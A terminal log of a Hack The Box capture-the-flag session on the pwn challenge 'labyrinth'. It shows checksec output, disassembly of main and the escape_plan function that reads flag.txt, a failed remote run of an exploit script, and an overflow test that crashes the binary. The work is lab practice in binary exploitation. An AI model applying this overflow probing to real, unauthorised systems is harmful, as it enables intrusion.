@@ -1,0 +1,883 @@
+\pwn_labyrinth\challenge; file labyrinth
+file : The term 'file' is not recognized as the name of a cmdlet, function, script file, or operable 
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and 
+try again.
+At line:1 char:66
++ ... ers\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge; file labyrin ...
++                                                              ~~~~
+    + CategoryInfo          : ObjectNotFound: (file:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl file labyrinth
+labyrinth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=86c87230616a87809e53b766b99987df9bf89ad8, for GNU/Linux 3.2.0, not stripped
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl checksec --file=labyrinth
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY    Fortified       Fortifiable     FILE
+Full RELRO      No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   83 Symbols        No       0               4               labyrinth
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl objdump -d labyrinth | grep -A 50 "<main>:"
+grep : The term 'grep' is not recognized as the name of a cmdlet, function, script file, or operable 
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and    
+try again.
+At line:1 char:28
++ wsl objdump -d labyrinth | grep -A 50 "<main>:"
++                            ~~~~
+    + CategoryInfo          : ObjectNotFound: (grep:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && objdump -d labyrinth | grep -A 50 '<main>:'"
+0000000000401405 <main>:
+  401405:       55                      push   %rbp
+  401406:       48 89 e5                mov    %rsp,%rbp
+  401409:       48 83 ec 30             sub    $0x30,%rsp
+  40140d:       e8 9c ff ff ff          call   4013ae <setup>
+  401412:       e8 64 ff ff ff          call   40137b <banner>
+  401417:       48 c7 45 d0 00 00 00    movq   $0x0,-0x30(%rbp)
+  40141e:       00
+  40141f:       48 c7 45 d8 00 00 00    movq   $0x0,-0x28(%rbp)
+  401426:       00
+  401427:       48 c7 45 e0 00 00 00    movq   $0x0,-0x20(%rbp)
+  40142e:       00
+  40142f:       48 c7 45 e8 00 00 00    movq   $0x0,-0x18(%rbp)
+  401436:       00
+  401437:       48 8b 05 d2 2b 00 00    mov    0x2bd2(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  40143e:       48 89 c1                mov    %rax,%rcx
+  401441:       ba 10 00 00 00          mov    $0x10,%edx
+  401446:       be 01 00 00 00          mov    $0x1,%esi
+  40144b:       48 8d 3d 0b 10 00 00    lea    0x100b(%rip),%rdi        # 40245d <_IO_stdin_used+0x45d>    
+  401452:       e8 d9 fc ff ff          call   401130 <fwrite@plt>
+  401457:       48 c7 45 f8 01 00 00    movq   $0x1,-0x8(%rbp)
+  40145e:       00
+  40145f:       e9 b5 00 00 00          jmp    401519 <main+0x114>
+  401464:       48 83 7d f8 09          cmpq   $0x9,-0x8(%rbp)
+  401469:       77 21                   ja     40148c <main+0x87>
+  40146b:       48 8b 05 9e 2b 00 00    mov    0x2b9e(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  401472:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
+  401476:       48 8d 35 f1 0f 00 00    lea    0xff1(%rip),%rsi        # 40246e <_IO_stdin_used+0x46e>     
+  40147d:       48 89 c7                mov    %rax,%rdi
+  401480:       b8 00 00 00 00          mov    $0x0,%eax
+  401485:       e8 36 fc ff ff          call   4010c0 <fprintf@plt>
+  40148a:       eb 47                   jmp    4014d3 <main+0xce>
+  40148c:       48 83 7d f8 63          cmpq   $0x63,-0x8(%rbp)
+  401491:       77 21                   ja     4014b4 <main+0xaf>
+  401493:       48 8b 05 76 2b 00 00    mov    0x2b76(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  40149a:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
+  40149e:       48 8d 35 d5 0f 00 00    lea    0xfd5(%rip),%rsi        # 40247a <_IO_stdin_used+0x47a>     
+  4014a5:       48 89 c7                mov    %rax,%rdi
+  4014a8:       b8 00 00 00 00          mov    $0x0,%eax
+  4014ad:       e8 0e fc ff ff          call   4010c0 <fprintf@plt>
+  4014b2:       eb 1f                   jmp    4014d3 <main+0xce>
+  4014b4:       48 8b 05 55 2b 00 00    mov    0x2b55(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  4014bb:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
+  4014bf:       48 8d 35 bf 0f 00 00    lea    0xfbf(%rip),%rsi        # 402485 <_IO_stdin_used+0x485>     
+  4014c6:       48 89 c7                mov    %rax,%rdi
+  4014c9:       b8 00 00 00 00          mov    $0x0,%eax
+  4014ce:       e8 ed fb ff ff          call   4010c0 <fprintf@plt>
+  4014d3:       48 8b 4d f8             mov    -0x8(%rbp),%rcx
+  4014d7:       48 ba cd cc cc cc cc    movabs $0xcccccccccccccccd,%rdx
+  4014de:       cc cc cc
+  4014e1:       48 89 c8                mov    %rcx,%rax
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && objdump -d labyrinth | grep -A 100 '<main>:' | head -120"
+0000000000401405 <main>:
+  401405:       55                      push   %rbp
+  401406:       48 89 e5                mov    %rsp,%rbp
+  401409:       48 83 ec 30             sub    $0x30,%rsp
+  40140d:       e8 9c ff ff ff          call   4013ae <setup>
+  401412:       e8 64 ff ff ff          call   40137b <banner>
+  401417:       48 c7 45 d0 00 00 00    movq   $0x0,-0x30(%rbp)
+  40141e:       00
+  40141f:       48 c7 45 d8 00 00 00    movq   $0x0,-0x28(%rbp)
+  401426:       00
+  401427:       48 c7 45 e0 00 00 00    movq   $0x0,-0x20(%rbp)
+  40142e:       00
+  40142f:       48 c7 45 e8 00 00 00    movq   $0x0,-0x18(%rbp)
+  401436:       00
+  401437:       48 8b 05 d2 2b 00 00    mov    0x2bd2(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  40143e:       48 89 c1                mov    %rax,%rcx
+  401441:       ba 10 00 00 00          mov    $0x10,%edx
+  401446:       be 01 00 00 00          mov    $0x1,%esi
+  40144b:       48 8d 3d 0b 10 00 00    lea    0x100b(%rip),%rdi        # 40245d <_IO_stdin_used+0x45d>    
+  401452:       e8 d9 fc ff ff          call   401130 <fwrite@plt>
+  401457:       48 c7 45 f8 01 00 00    movq   $0x1,-0x8(%rbp)
+  40145e:       00
+  40145f:       e9 b5 00 00 00          jmp    401519 <main+0x114>
+  401464:       48 83 7d f8 09          cmpq   $0x9,-0x8(%rbp)
+  401469:       77 21                   ja     40148c <main+0x87>
+  40146b:       48 8b 05 9e 2b 00 00    mov    0x2b9e(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  401472:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
+  401476:       48 8d 35 f1 0f 00 00    lea    0xff1(%rip),%rsi        # 40246e <_IO_stdin_used+0x46e>     
+  40147d:       48 89 c7                mov    %rax,%rdi
+  401480:       b8 00 00 00 00          mov    $0x0,%eax
+  401485:       e8 36 fc ff ff          call   4010c0 <fprintf@plt>
+  40148a:       eb 47                   jmp    4014d3 <main+0xce>
+  40148c:       48 83 7d f8 63          cmpq   $0x63,-0x8(%rbp)
+  401491:       77 21                   ja     4014b4 <main+0xaf>
+  401493:       48 8b 05 76 2b 00 00    mov    0x2b76(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  40149a:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
+  40149e:       48 8d 35 d5 0f 00 00    lea    0xfd5(%rip),%rsi        # 40247a <_IO_stdin_used+0x47a>     
+  4014a5:       48 89 c7                mov    %rax,%rdi
+  4014a8:       b8 00 00 00 00          mov    $0x0,%eax
+  4014ad:       e8 0e fc ff ff          call   4010c0 <fprintf@plt>
+  4014b2:       eb 1f                   jmp    4014d3 <main+0xce>
+  4014b4:       48 8b 05 55 2b 00 00    mov    0x2b55(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  4014bb:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
+  4014bf:       48 8d 35 bf 0f 00 00    lea    0xfbf(%rip),%rsi        # 402485 <_IO_stdin_used+0x485>     
+  4014c6:       48 89 c7                mov    %rax,%rdi
+  4014c9:       b8 00 00 00 00          mov    $0x0,%eax
+  4014ce:       e8 ed fb ff ff          call   4010c0 <fprintf@plt>
+  4014d3:       48 8b 4d f8             mov    -0x8(%rbp),%rcx
+  4014d7:       48 ba cd cc cc cc cc    movabs $0xcccccccccccccccd,%rdx
+  4014de:       cc cc cc
+  4014e1:       48 89 c8                mov    %rcx,%rax
+  4014e4:       48 f7 e2                mul    %rdx
+  4014e7:       48 c1 ea 03             shr    $0x3,%rdx
+  4014eb:       48 89 d0                mov    %rdx,%rax
+  4014ee:       48 c1 e0 02             shl    $0x2,%rax
+  4014f2:       48 01 d0                add    %rdx,%rax
+  4014f5:       48 01 c0                add    %rax,%rax
+  4014f8:       48 29 c1                sub    %rax,%rcx
+  4014fb:       48 89 ca                mov    %rcx,%rdx
+  4014fe:       48 85 d2                test   %rdx,%rdx
+  401501:       75 11                   jne    401514 <main+0x10f>
+  401503:       48 83 7d f8 00          cmpq   $0x0,-0x8(%rbp)
+  401508:       74 0a                   je     401514 <main+0x10f>
+  40150a:       bf 0a 00 00 00          mov    $0xa,%edi
+  40150f:       e8 1c fb ff ff          call   401030 <putchar@plt>
+  401514:       48 83 45 f8 01          addq   $0x1,-0x8(%rbp)
+  401519:       48 83 7d f8 64          cmpq   $0x64,-0x8(%rbp)
+  40151e:       0f 86 40 ff ff ff       jbe    401464 <main+0x5f>
+  401524:       48 8b 05 e5 2a 00 00    mov    0x2ae5(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  40152b:       48 89 c1                mov    %rax,%rcx
+  40152e:       ba 04 00 00 00          mov    $0x4,%edx
+  401533:       be 01 00 00 00          mov    $0x1,%esi
+  401538:       48 8d 3d 50 0f 00 00    lea    0xf50(%rip),%rdi        # 40248f <_IO_stdin_used+0x48f>
+  40153f:       e8 ec fb ff ff          call   401130 <fwrite@plt>
+  401544:       bf 10 00 00 00          mov    $0x10,%edi
+  401549:       e8 82 fb ff ff          call   4010d0 <malloc@plt>
+  40154e:       48 89 45 f0             mov    %rax,-0x10(%rbp)
+  401552:       48 8b 15 c7 2a 00 00    mov    0x2ac7(%rip),%rdx        # 404020 <stdin@GLIBC_2.2.5>       
+  401559:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  40155d:       be 05 00 00 00          mov    $0x5,%esi
+  401562:       48 89 c7                mov    %rax,%rdi
+  401565:       e8 46 fb ff ff          call   4010b0 <fgets@plt>
+  40156a:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  40156e:       ba 02 00 00 00          mov    $0x2,%edx
+  401573:       48 8d 35 1a 0f 00 00    lea    0xf1a(%rip),%rsi        # 402494 <_IO_stdin_used+0x494>     
+  40157a:       48 89 c7                mov    %rax,%rdi
+  40157d:       e8 be fa ff ff          call   401040 <strncmp@plt>
+  401582:       85 c0                   test   %eax,%eax
+  401584:       74 1c                   je     4015a2 <main+0x19d>
+  401586:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  40158a:       ba 03 00 00 00          mov    $0x3,%edx
+  40158f:       48 8d 35 01 0f 00 00    lea    0xf01(%rip),%rsi        # 402497 <_IO_stdin_used+0x497>     
+  401596:       48 89 c7                mov    %rax,%rdi
+  401599:       e8 a2 fa ff ff          call   401040 <strncmp@plt>
+  40159e:       85 c0                   test   %eax,%eax
+  4015a0:       75 38                   jne    4015da <main+0x1d5>
+  4015a2:       48 8b 05 67 2a 00 00    mov    0x2a67(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  4015a9:       48 89 c1                mov    %rax,%rcx
+  4015ac:       ba a0 00 00 00          mov    $0xa0,%edx
+  4015b1:       be 01 00 00 00          mov    $0x1,%esi
+  4015b6:       48 8d 3d e3 0e 00 00    lea    0xee3(%rip),%rdi        # 4024a0 <_IO_stdin_used+0x4a0>     
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && objdump -d labyrinth | grep -A 150 '<main>:' | tail -80"
+  401533:       be 01 00 00 00          mov    $0x1,%esi
+  401538:       48 8d 3d 50 0f 00 00    lea    0xf50(%rip),%rdi        # 40248f <_IO_stdin_used+0x48f>     
+  40153f:       e8 ec fb ff ff          call   401130 <fwrite@plt>
+  401544:       bf 10 00 00 00          mov    $0x10,%edi
+  401549:       e8 82 fb ff ff          call   4010d0 <malloc@plt>
+  40154e:       48 89 45 f0             mov    %rax,-0x10(%rbp)
+  401552:       48 8b 15 c7 2a 00 00    mov    0x2ac7(%rip),%rdx        # 404020 <stdin@GLIBC_2.2.5>       
+  401559:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  40155d:       be 05 00 00 00          mov    $0x5,%esi
+  401562:       48 89 c7                mov    %rax,%rdi
+  401565:       e8 46 fb ff ff          call   4010b0 <fgets@plt>
+  40156a:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  40156e:       ba 02 00 00 00          mov    $0x2,%edx
+  401573:       48 8d 35 1a 0f 00 00    lea    0xf1a(%rip),%rsi        # 402494 <_IO_stdin_used+0x494>     
+  40157a:       48 89 c7                mov    %rax,%rdi
+  40157d:       e8 be fa ff ff          call   401040 <strncmp@plt>
+  401582:       85 c0                   test   %eax,%eax
+  401584:       74 1c                   je     4015a2 <main+0x19d>
+  401586:       48 8b 45 f0             mov    -0x10(%rbp),%rax
+  40158a:       ba 03 00 00 00          mov    $0x3,%edx
+  40158f:       48 8d 35 01 0f 00 00    lea    0xf01(%rip),%rsi        # 402497 <_IO_stdin_used+0x497>     
+  401596:       48 89 c7                mov    %rax,%rdi
+  401599:       e8 a2 fa ff ff          call   401040 <strncmp@plt>
+  40159e:       85 c0                   test   %eax,%eax
+  4015a0:       75 38                   jne    4015da <main+0x1d5>
+  4015a2:       48 8b 05 67 2a 00 00    mov    0x2a67(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  4015a9:       48 89 c1                mov    %rax,%rcx
+  4015ac:       ba a0 00 00 00          mov    $0xa0,%edx
+  4015b1:       be 01 00 00 00          mov    $0x1,%esi
+  4015b6:       48 8d 3d e3 0e 00 00    lea    0xee3(%rip),%rdi        # 4024a0 <_IO_stdin_used+0x4a0>     
+  4015bd:       e8 6e fb ff ff          call   401130 <fwrite@plt>
+  4015c2:       48 8b 15 57 2a 00 00    mov    0x2a57(%rip),%rdx        # 404020 <stdin@GLIBC_2.2.5>       
+  4015c9:       48 8d 45 d0             lea    -0x30(%rbp),%rax
+  4015cd:       be 44 00 00 00          mov    $0x44,%esi
+  4015d2:       48 89 c7                mov    %rax,%rdi
+  4015d5:       e8 d6 fa ff ff          call   4010b0 <fgets@plt>
+  4015da:       48 8b 05 2f 2a 00 00    mov    0x2a2f(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  4015e1:       48 8d 15 59 0f 00 00    lea    0xf59(%rip),%rdx        # 402541 <_IO_stdin_used+0x541>     
+  4015e8:       48 8d 35 61 0f 00 00    lea    0xf61(%rip),%rsi        # 402550 <_IO_stdin_used+0x550>     
+  4015ef:       48 89 c7                mov    %rax,%rdi
+  4015f2:       b8 00 00 00 00          mov    $0x0,%eax
+  4015f7:       e8 c4 fa ff ff          call   4010c0 <fprintf@plt>
+  4015fc:       b8 00 00 00 00          mov    $0x0,%eax
+  401601:       c9                      leave
+  401602:       c3                      ret
+  401603:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
+  40160a:       00 00 00
+  40160d:       0f 1f 00                nopl   (%rax)
+
+0000000000401610 <__libc_csu_init>:
+  401610:       41 57                   push   %r15
+  401612:       4c 8d 3d 27 27 00 00    lea    0x2727(%rip),%r15        # 403d40 <__frame_dummy_init_array_entry>
+  401619:       41 56                   push   %r14
+  40161b:       49 89 d6                mov    %rdx,%r14
+  40161e:       41 55                   push   %r13
+  401620:       49 89 f5                mov    %rsi,%r13
+  401623:       41 54                   push   %r12
+  401625:       41 89 fc                mov    %edi,%r12d
+  401628:       55                      push   %rbp
+  401629:       48 8d 2d 18 27 00 00    lea    0x2718(%rip),%rbp        # 403d48 <__do_global_dtors_aux_fini_array_entry>
+  401630:       53                      push   %rbx
+  401631:       4c 29 fd                sub    %r15,%rbp
+  401634:       48 83 ec 08             sub    $0x8,%rsp
+  401638:       e8 c3 f9 ff ff          call   401000 <_init>
+  40163d:       48 c1 fd 03             sar    $0x3,%rbp
+  401641:       74 1b                   je     40165e <__libc_csu_init+0x4e>
+  401643:       31 db                   xor    %ebx,%ebx
+  401645:       0f 1f 00                nopl   (%rax)
+  401648:       4c 89 f2                mov    %r14,%rdx
+  40164b:       4c 89 ee                mov    %r13,%rsi
+  40164e:       44 89 e7                mov    %r12d,%edi
+  401651:       41 ff 14 df             call   *(%r15,%rbx,8)
+  401655:       48 83 c3 01             add    $0x1,%rbx
+  401659:       48 39 dd                cmp    %rbx,%rbp
+  40165c:       75 ea                   jne    401648 <__libc_csu_init+0x38>
+  40165e:       48 83 c4 08             add    $0x8,%rsp
+  401662:       5b                      pop    %rbx
+  401663:       5d                      pop    %rbp
+  401664:       41 5c                   pop    %r12
+  401666:       41 5d                   pop    %r13
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && objdump -d labyrinth | grep -E '<escape|<win|<flag|<shell|<secret'"
+0000000000401255 <escape_plan>:
+  4012cd:       79 2e                   jns    4012fd <escape_plan+0xa8>
+  401316:       7f cd                   jg     4012e5 <escape_plan+0x90>
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && objdump -d labyrinth | grep -A 50 '<escape_plan>:'"
+0000000000401255 <escape_plan>:
+  401255:       55                      push   %rbp
+  401256:       48 89 e5                mov    %rsp,%rbp
+  401259:       48 83 ec 10             sub    $0x10,%rsp
+  40125d:       bf 0a 00 00 00          mov    $0xa,%edi
+  401262:       e8 c9 fd ff ff          call   401030 <putchar@plt>
+  401267:       48 8b 05 a2 2d 00 00    mov    0x2da2(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  40126e:       48 89 c1                mov    %rax,%rcx
+  401271:       ba f0 01 00 00          mov    $0x1f0,%edx
+  401276:       be 01 00 00 00          mov    $0x1,%esi
+  40127b:       48 8d 3d 96 0d 00 00    lea    0xd96(%rip),%rdi        # 402018 <_IO_stdin_used+0x18>      
+  401282:       e8 a9 fe ff ff          call   401130 <fwrite@plt>
+  401287:       48 8b 05 82 2d 00 00    mov    0x2d82(%rip),%rax        # 404010 <stdout@GLIBC_2.2.5>      
+  40128e:       48 8d 0d 74 0f 00 00    lea    0xf74(%rip),%rcx        # 402209 <_IO_stdin_used+0x209>     
+  401295:       48 8d 15 72 0f 00 00    lea    0xf72(%rip),%rdx        # 40220e <_IO_stdin_used+0x20e>     
+  40129c:       48 8d 35 75 0f 00 00    lea    0xf75(%rip),%rsi        # 402218 <_IO_stdin_used+0x218>     
+  4012a3:       48 89 c7                mov    %rax,%rdi
+  4012a6:       b8 00 00 00 00          mov    $0x0,%eax
+  4012ab:       e8 10 fe ff ff          call   4010c0 <fprintf@plt>
+  4012b0:       be 00 00 00 00          mov    $0x0,%esi
+  4012b5:       48 8d 3d ba 0f 00 00    lea    0xfba(%rip),%rdi        # 402276 <_IO_stdin_used+0x276>     
+  4012bc:       b8 00 00 00 00          mov    $0x0,%eax
+  4012c1:       e8 2a fe ff ff          call   4010f0 <open@plt>
+  4012c6:       89 45 fc                mov    %eax,-0x4(%rbp)
+  4012c9:       83 7d fc 00             cmpl   $0x0,-0x4(%rbp)
+  4012cd:       79 2e                   jns    4012fd <escape_plan+0xa8>
+  4012cf:       48 8d 3d b2 0f 00 00    lea    0xfb2(%rip),%rdi        # 402288 <_IO_stdin_used+0x288>     
+  4012d6:       e8 25 fe ff ff          call   401100 <perror@plt>
+  4012db:       bf 01 00 00 00          mov    $0x1,%edi
+  4012e0:       e8 3b fe ff ff          call   401120 <exit@plt>
+  4012e5:       0f b6 45 fb             movzbl -0x5(%rbp),%eax
+  4012e9:       0f be c0                movsbl %al,%eax
+  4012ec:       48 8b 15 1d 2d 00 00    mov    0x2d1d(%rip),%rdx        # 404010 <stdout@GLIBC_2.2.5>      
+  4012f3:       48 89 d6                mov    %rdx,%rsi
+  4012f6:       89 c7                   mov    %eax,%edi
+  4012f8:       e8 93 fd ff ff          call   401090 <fputc@plt>
+  4012fd:       48 8d 4d fb             lea    -0x5(%rbp),%rcx
+  401301:       8b 45 fc                mov    -0x4(%rbp),%eax
+  401304:       ba 01 00 00 00          mov    $0x1,%edx
+  401309:       48 89 ce                mov    %rcx,%rsi
+  40130c:       89 c7                   mov    %eax,%edi
+  40130e:       e8 8d fd ff ff          call   4010a0 <read@plt>
+  401313:       48 85 c0                test   %rax,%rax
+  401316:       7f cd                   jg     4012e5 <escape_plan+0x90>
+  401318:       8b 45 fc                mov    -0x4(%rbp),%eax
+  40131b:       89 c7                   mov    %eax,%edi
+  40131d:       e8 5e fd ff ff          call   401080 <close@plt>
+  401322:       90                      nop
+  401323:       c9                      leave
+  401324:       c3                      ret
+
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && strings labyrinth | grep -E '69|flag|door'"
+./flag.txt
+Error opening flag.txt, please contact an Administrator.
+Select door:
+You are heading to open the door but you suddenly see something on the wall:
+Would you like to change the door you chose?
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && strings labyrinth | head -50"
+./glibc/ld-linux-x86-64.so.2
+r0aj
+exit
+strncmp
+perror
+puts
+putchar
+stdin
+fgets
+read
+stdout
+fputc
+strtoul
+malloc
+alarm
+fwrite
+close
+open
+fprintf
+setvbuf
+__libc_start_main
+libc.so.6
+GLIBC_2.2.5
+./glibc/
+__gmon_start__
+        w!H
+cw!H
+[]A\A]A^A_
+[%d;%dH
+                \O/
+                 |
+                / \
+
+
+
+
+
+
+
+
+
+
+
+[1;32m
+%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s
+./flag.txt
+Error opening flag.txt, please contact an Administrator.
+[1;35m
+
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && strings -n 3 labyrinth | grep -E '^[0-9]+$|YES|NO|yes|no|69'"
+069
+.note.gnu.build-id
+.note.ABI-tag
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth && python3 exploit.py REMOTE"
+[*] '/mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge/labyrinth'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  b'./glibc/'
+[+] Opening connection to 94.237.120.74 on port 53289: Done
+[*] Switching to interactive mode
+
+
+>> 
+[-] YOU FAILED TO ESCAPE!
+
+[*] Got EOF while reading in interactive
+$ ls
+$ 
+[*] Interrupted
+[*] Closed connection to 94.237.120.74 port 53289
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && echo -e '69\nyes' | timeout 2 ./labyrinth 2>&1 || true"
+
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒     O     ▒          ▒
+▒-▸        ▒    '|'    ▒          ▒
+▒-▸        ▒    / \    ▒          ▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒
+
+Select door: 
+
+Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 
+Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 
+Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 
+Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 
+Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 
+Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 
+Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 
+Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 
+Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 
+Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 
+
+>> 
+You are heading to open the door but you suddenly see something on the wall:
+
+"Fly like a bird and be free!"
+
+Would you like to change the door you chose?
+
+>> 
+[-] YOU FAILED TO ESCAPE!
+
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> 
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> 
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> ls
+
+
+    Directory: C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          1/5/2026   2:25 PM                glibc
+-a----          1/5/2026   2:25 PM             25 flag.txt
+-a----          1/5/2026   2:25 PM          17192 labyrinth
+
+
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> ^C
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_labyrinth\challenge> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_labyrinth/challenge && echo -e '69\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | timeout 2 ./labyrinth 2>&1 || true"
+
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒-▸        ▒           ▒          ▒
+▒-▸        ▒     O     ▒          ▒
+▒-▸        ▒    '|'    ▒          ▒
+▒-▸        ▒    / \    ▒          ▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒
+
+Select door: 
+
+Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 
+Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 
+Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 
+Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 
+Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 
+Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 
+Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 
+Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 
+Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 
+Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 
+
+>> 
+You are heading to open the door but you suddenly see something on the wall:
+
+"Fly like a bird and be free!"
+
+Would you like to change the door you chose?
+
+>> 
+[-] YOU FAILED TO ESCAPE!
+
+timeout: the monitored command dumped core
